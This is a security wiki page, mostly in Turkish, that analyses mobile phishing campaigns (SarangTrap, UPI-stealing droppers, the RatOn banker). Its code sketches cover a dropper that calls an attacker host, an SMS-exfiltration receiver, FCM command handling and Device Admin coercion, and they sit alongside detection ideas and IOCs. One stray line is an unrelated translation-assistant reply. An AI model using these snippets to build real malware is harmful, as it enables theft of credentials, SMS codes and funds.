# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin phishing (SEO, social engineering, fake stores, dating apps, vb.) yoluyla **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandıkları teknikleri kapsar.
> Materyal, Zimperium zLabs tarafından ifşa edilen SarangTrap kampanyası (2025) ve diğer kamu araştırmalarından uyarlanmıştır.

## Saldırı Akışı

1. **SEO/Phishing Altyapısı**
* Çok sayıda benzer görünümlü domain kaydedin (dating, cloud share, car service…).
– Google'da sıralama için `<title>` öğesine yerel dil anahtar kelimeleri ve emoji ekleyin.
– Aynı açılış sayfasında hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
2. **First Stage Download**
* Android: *unsigned* veya “third-party store” APK'ya doğrudan bağlantı.
* iOS: `itms-services://` veya düz HTTPS link ile kötü amaçlı bir **mobileconfig** profile yönlendirme (aşağıya bakın).
3. **Kurulum Sonrası Social Engineering**
* İlk çalıştırmada uygulama **davet / doğrulama kodu** ister (özel erişim yanılsaması).
* Kod, Command-and-Control (C2)'ye **HTTP üzerinden POST** edilir.
* C2 `{"success":true}` ile yanıt verir ➜ malware devam eder.
* Geçerli kod göndermeyen Sandbox / AV dynamic analysis, **no malicious behaviour** görür (evasion).
4. **Runtime Permission Abuse** (Android)
* Tehlikeli izinler yalnızca **positive C2 response** sonrasında istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Yeni varyantlar `AndroidManifest.xml` içinden SMS için `<uses-permission>` etiketini **kaldırır** ancak SMS'i reflection ile okuyan Java/Kotlin kod yolunu bırakır ⇒ statik skoru düşürürken, `AppOps` abuse veya eski hedeflerde izin verilmişse hâlâ çalışır.
5. **Facade UI & Background Collection**
* Uygulama yerel olarak uygulanmış zararsız görünümler (SMS viewer, gallery picker) gösterir.
* Bu sırada şu verileri dışa aktarır:
- IMEI / IMSI, telefon numarası
- Tam `ContactsContract` dökümü (JSON array)
- `/sdcard/DCIM` içindeki JPEG/PNG'ler [Luban](https://github.com/Curzibn/Luban) ile sıkıştırılarak boyut azaltılır
- Opsiyonel SMS içeriği (`content://sms`)
Payload'lar **batch-zipped** edilerek `HTTP POST /upload.php` ile gönderilir.
6. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyerek cihazı “MDM” benzeri denetime kaydedebilir.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker *Contacts* & *Photo* entitlement kazanır, App Store review olmadan.
7. **Ağ Katmanı**
* Düz HTTP, genelde port 80 üzerinde HOST header `api.<phishingdomain>.com` gibi.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → tespit etmesi kolay).

## Defensive Testing / Red-Team İpuçları

* **Dynamic Analysis Bypass** – Malware assessment sırasında, kötü amaçlı şubeye ulaşmak için Frida/Objection ile invitation code aşamasını otomatikleştirin.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` ile runtime `PackageManager#getRequestedPermissions()` karşılaştırın; eksik tehlikeli izinler bir uyarı işaretidir.
* **Network Canary** – Kod girişinden sonra düzensiz POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig Inspection** – macOS'ta `security cms -D -i profile.mobileconfig` kullanarak `PayloadContent`'i listeleyin ve aşırı yetkileri tespit edin.

## Blue-Team Tespit Fikirleri

* **Certificate Transparency / DNS Analytics** ile anahtar kelime içeren domainlerde ani artışları yakalayın.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` Google Play dışındaki Dalvik client'lardan gelen istekler için.
* **Invite-code Telemetry** – APK kurulumundan kısa süre sonra 6–8 haneli sayısal kodların POST edilmesi staging göstergesi olabilir.
* **MobileConfig Signing** – MDM politikası ile unsigned configuration profile'ları engelleyin.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Statik triage ipucu (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamik endpoint keşfi shortlink aracılığıyla
- Malware, bir shortlink'ten düz metin, virgülle ayrılmış canlı endpoint listesini çeker; basit string dönüşümleri nihai phishing sayfası yolunu üretir.

Örnek (sansürlenmiş):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Sözde kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” adımı, dinamik endpoint'ten WebView içinde bir attacker HTML formu yükler ve hassas alanları (telefon, banka, UPI PIN) yakalar; bu alanlar `POST` ile `addup.php`'ye gönderilir.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation ve SMS/OTP yakalama
- İlk çalıştırmada agresif izinler istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kişiler, kurbanın cihazından toplu smishing SMS göndermek için döngüye alınır.
- Gelen SMS'ler bir broadcast receiver tarafından yakalanır ve meta verilerle (gönderen, içerik, SIM yuvası, cihaza özel rastgele ID) `/addsm.php`'ye yüklenir.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) olarak dayanıklı C2
- Payload, FCM'ye kayıt olur; push mesajları, eylemleri tetiklemek için anahtar olarak kullanılan `_type` alanını taşır (ör. phishing metin şablonlarını güncellemek, davranışları açıp kapatmak).

Örnek FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler taslağı:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Avlama kalıpları ve IOC'ler
- APK, ikincil payload'ı `assets/app.apk` içinde içerir
- WebView `gate.htm`'den ödeme yükler ve `/addup.php`'ye veri sızdırır
- SMS'in `/addsm.php`'ye sızdırılması
- Shortlink tabanlı konfigürasyon çekimi (ör. `rebrand.ly/*`) CSV endpoint'leri döndürür
- Uygulamalar genel olarak “Update/Secure Update” olarak etiketlenmiş
- Güvenilmeyen uygulamalarda `_type` ayırıcıya sahip FCM `data` mesajları

### Tespit ve savunma fikirleri
- Kullanıcıları kurulum sırasında ağı devre dışı bırakmaya yönlendiren ve ardından `assets/`'ten ikinci bir APK yan yükleyen uygulamaları işaretle.
- İzin kombinasyonu için uyarı: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView tabanlı ödeme akışları.
- Kurumsal olmayan hostlarda `POST /addup.php|/addsm.php` için çıkış trafiği izleme; bilinen altyapıyı engelle.
- Mobile EDR kuralları: FCM'ye kayıt olan ve `_type` alanına göre dallanan güvenilmeyen uygulama.

---

## Android Accessibility/Overlay & Device Admin Suistimali, ATS otomasyonu, ve NFC relay orkestrasyonu – RatOn vaka çalışması

RatOn banker/RAT campaign (ThreatFabric), modern mobil phishing operasyonlarının WebView dropper'ları, Accessibility kaynaklı UI otomasyonu, overlays/ransom, Device Admin zorlama, Automated Transfer System (ATS), kripto cüzdanı ele geçirme ve hatta NFC-relay orkestrasyonunu nasıl harmanladığının somut bir örneğidir. Bu bölüm yeniden kullanılabilir teknikleri soyutlar.

### Aşama-1: WebView → native kurulum köprüsü (dropper)
Saldırganlar, saldırgan sayfasına işaret eden bir WebView sunar ve native kurulum programını açığa çıkaran bir JavaScript arayüzü enjekte eder. Bir HTML düğmesine dokunma, dropper'ın assets'inde paketlenmiş ikinci aşama APK'yı kuran native koda çağrı yapar ve ardından doğrudan başlatır.

Minimal desen:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
İçeriği çevirip döndürebilmem için lütfen sayfadaki HTML veya çevirmemi istediğiniz metni buraya yapıştırın.
```html
<button onclick="bridge.installApk()">Install</button>
```
Yüklemeden sonra, dropper explicit package/activity aracılığıyla payload'u başlatır:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Tehdit avı fikri: güvenilmeyen uygulamaların `addJavascriptInterface()` çağırıp WebView'a installer-benzeri yöntemler erişime açması; APK'nin `assets/` altında gömülü ikincil bir payload taşıması ve Package Installer Session API'yi çağırması.

### Onay akışı: Accessibility + Device Admin + takip eden runtime istemleri
Stage-2, içinde “Erişim” sayfası barındıran bir WebView açar. Sayfadaki düğme, kurbanı Accessibility ayarlarına yönlendiren ve sahte servisin etkinleştirilmesini isteyen bir exported method'u çağırır. İzin verildiğinde, malware Accessibility'yi kullanarak sonraki runtime izin diyaloglarında (contacts, overlay, manage system settings, vb.) otomatik tıklama yapar ve Device Admin ister.

- Accessibility programatik olarak node-tree içinde “Allow”/“OK” gibi butonları bularak sonraki istemleri kabul etmeye yardımcı olur ve tıklamaları tetikler.
- Overlay izni kontrol/isteği:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView üzerinden overlay phishing/ransom
Operatörler şu komutları verebilir:
- bir URL'den tam ekran overlay render etmek, veya
- inline HTML geçirip bunun bir WebView overlay'inde yüklenmesini sağlamak.

Muhtemel kullanım: coercion (PIN girişi), cüzdan açtırma ile PIN yakalama, fidye mesajları. Eksikse overlay izninin verildiğini doğrulamak için bir komut bulundurun.

### Uzak kontrol modeli – metin pseudo-ekran + screen-cast
- Düşük bant genişliği: Accessibility node tree'i periyodik olarak dump edin, görünür metinleri/rolleri/bounds'ları serialize edip pseudo-ekran olarak C2'ye gönderin (komutlar gibi `txt_screen` bir kere ve `screen_live` sürekli).
- Yüksek doğruluk: MediaProjection isteyin ve talep üzerine screen-casting/recording başlatın (komutlar gibi `display` / `record`).

### ATS playbook (banka uygulaması otomasyonu)
Verilen bir JSON göreviyle, banka uygulamasını açın, metin sorguları ve koordinat tıklamalarının karışımıyla Accessibility üzerinden UI'ı yönlendirin ve istendiğinde mağdurun ödeme PIN'ini girin.

Örnek görev:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Bir hedef akışında görülen örnek metinler (CZ → EN):
- "Nová platba" → "Yeni ödeme"
- "Zadat platbu" → "Ödeme gir"
- "Nový příjemce" → "Yeni alıcı"
- "Domácí číslo účtu" → "Yurtiçi hesap numarası"
- "Další" → "İleri"
- "Odeslat" → "Gönder"
- "Ano, pokračovat" → "Evet, devam et"
- "Zaplatit" → "Öde"
- "Hotovo" → "Tamamlandı"

Operatörler ayrıca transfer limitlerini kontrol etmek/yükseltmek için `check_limit` ve `limit` gibi limitler UI'sında benzer şekilde gezinmeyi sağlayan komutları kullanabilir.

### Kripto cüzdan seed çıkarımı
Hedefler: MetaMask, Trust Wallet, Blockchain.com, Phantom. Akış: unlock (çalınmış PIN veya sağlanan parola), Security/Recovery bölümüne git, seed phrase'i reveal/show et, keylog ile exfiltrate et. Dil farklılıkları arasında gezinmeyi kararlı hale getirmek için locale-aware seçiciler (EN/RU/CZ/SK) uygulayın.

### Device Admin zorlaması
Device Admin APIs, PIN-capture fırsatlarını artırmak ve kurbanın müdahalesini zorlaştırmak için kullanılır:

- Anında kilitleme:
```java
dpm.lockNow();
```
- Geçerli kimlik bilgilerini süresini sona erdirerek değiştirmeyi zorla (Accessibility yeni PIN/parolayı yakalar):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Keyguard biyometrik özelliklerini devre dışı bırakarak biyometrik olmayan kilidi zorla:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Not: Birçok DevicePolicyManager kontrolü, güncel Android sürümlerinde Device Owner/Profile Owner gerektirir; bazı OEM build'leri gevşek olabilir. Hedef OS/OEM üzerinde her zaman doğrulayın.

### NFC relay orchestration (NFSkate)
Stage-3 harici bir NFC-relay modülü (ör. NFSkate) kurup başlatabilir ve röle sırasında mağduru yönlendirmek için bir HTML şablonu bile verebilir. Bu, online ATS ile birlikte temassız, kart-present cash-out yapılabilmesini sağlar.

Arka plan: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operatör komut seti (örnek)
- UI/durum: `txt_screen`, `screen_live`, `display`, `record`
- Sosyal: `send_push`, `Facebook`, `WhatsApp`
- Bindirmeler: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Cüzdanlar: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Cihaz: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- İletişim/Keşif: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Tespit ve savunma fikirleri (RatOn tarzı)
- Installer/permission yöntemlerini açığa çıkaran `addJavascriptInterface()` içeren WebViews için avlanın; Accessibility istemlerini tetikleyen “/access” ile biten sayfalar.
- Servis erişimi verildikten kısa süre sonra yüksek oranlı Accessibility hareketleri/tıklamaları üreten uygulamalar için uyarı; C2'ye gönderilen Accessibility node dump'larını andıran telemetri.
- Güvenilmeyen uygulamalarda Device Admin politika değişikliklerini izleyin: `lockNow`, şifre süresi dolması, keyguard özelliklerinin açılıp kapatılması.
- Kurumsal olmayan uygulamalardan gelen MediaProjection istemleri ve bunları takiben periyodik frame yüklemeleri için uyarı.
- Bir uygulama tarafından tetiklenen harici bir NFC-relay uygulamasının yüklenmesini/başlatılmasını tespit edin.
- Bankacılık için: kanal dışı onaylar, biyometrik-bağlama ve cihaz üzeri otomasyona dayanıklı işlem limitleri uygulayın.

## Kaynaklar

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
